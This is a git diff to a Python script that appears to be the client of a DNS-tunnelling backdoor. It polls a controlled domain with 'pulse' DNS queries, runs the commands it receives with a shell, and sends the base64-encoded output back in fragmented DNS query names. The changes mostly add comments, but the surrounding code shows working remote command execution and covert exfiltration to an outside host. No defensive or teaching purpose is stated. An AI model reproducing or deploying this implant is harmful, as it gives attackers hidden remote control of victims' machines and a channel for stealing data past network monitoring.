@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-from scapy.all import DNS, DNSQR, IP, UDP, sr, sr1
+from scapy.all import IP, UDP, DNS, DNSQR, sr, sr1
 from base64 import b64encode, b64decode
 from random import randint
 from time import sleep
@@ -15,9 +15,10 @@ TIMEOUT = 5
 
 FRAG_LEN = 70 - len(DOMAIN)
 
-recv = b""
+recv = b""  # Buffer of received data to process
 
 
+# Execute shell command
 def execute(cmd: bytes) -> bytes:
     out, err = subprocess.Popen([cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 shell=True).communicate()
@@ -28,18 +29,19 @@ def execute(cmd: bytes) -> bytes:
         return err
 
 
+# Pulse the server at interval
 def pulse() -> None:
     global recv
     while True:
         ip = IP(dst=f"www.{DOMAIN}")
         udp = UDP(dport=53)
         dns = DNS(id=randint(0x0, 0xffff), rd=1, qr=0, qd=DNSQR(qname=f"pulse.{DOMAIN}", qtype="A"))
-        beat = ip / udp / dns
 
-        res = sr1(beat, iface=IFACE, verbose=False, timeout=TIMEOUT)
+        res = sr1(ip / udp / dns, iface=IFACE, verbose=False, timeout=TIMEOUT)
 
         data = res.an.rrname.split(f".{DOMAIN}".encode())[0]
 
+        # Run command when it's not a pulse
         if data != b"pulse":
             recv += data
 
@@ -55,6 +57,7 @@ def pulse() -> None:
         sleep(PULSE)
 
 
+# Encode data into base64 and fragment it
 def encode(data: bytes) -> list:
     data = data.strip()
     e_data = b64encode(data).decode()
@@ -62,11 +65,13 @@ def encode(data: bytes) -> list:
     return frag_e_data
 
 
+# Decode base64 data
 def decode(data: bytes) -> bytes:
     data = b64decode(recv)
     return data
 
 
+# Send data over DNS
 def send_data(data: bytes) -> None:
     frag_e_data = encode(data)
 
@@ -79,6 +84,7 @@ def send_data(data: bytes) -> None:
                   qr=0,
                   qd=DNSQR(qname=f"{data}.{DOMAIN}", qtype="A"))
 
+        # Check if it's last item in the base64 string
         if i + 1 == len(frag_e_data):
             dns.z = 1
 
